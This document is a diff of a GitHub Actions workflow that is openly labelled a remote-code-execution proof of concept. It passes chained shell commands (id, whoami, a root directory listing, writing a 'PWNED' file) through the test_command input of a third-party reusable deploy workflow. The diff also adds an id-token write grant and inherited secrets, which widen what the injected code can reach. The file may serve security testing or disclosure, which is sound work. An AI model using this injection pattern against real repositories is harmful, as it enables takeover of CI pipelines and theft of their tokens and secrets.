@@ -1,17 +1,24 @@
-name: Malicious Workflow PoC - RCE via test_command Injection
+name: RCE PoC via test_command Injection
+
 on:
   workflow_dispatch:
 
+permissions:
+  id-token: write  # ये add करके permission inherit allow करो (अगर repo allow करे)
+  contents: read
+
 jobs:
   attack:
-    permissions:
-      id-token: write  # This line fixes the error
     uses: ultimateai/workflows/.github/workflows/deploy-from-branch.yml@main
+    permissions:
+      id-token: write  # explicit grant
     with:
-      image_repo: 'dummy-repo/dummy-image'
-      app_squad: 'dummy-squad'
+      image_repo: 'dummy/dummy'
+      app_squad: 'dummy'
       github_email: 'bot@example.com'
       github_user: 'github-actions-bot'
-      k8s_manifests_repo: 'dummy-org/dummy-k8s-repo'
+      k8s_manifests_repo: 'dummy/dummy'
       branch_name: 'main'
       test_command: 'id; whoami; pwd; ls -la /; echo "PWNED" > /tmp/pwned.txt; cat /tmp/pwned.txt'
+    secrets:
+      inherit
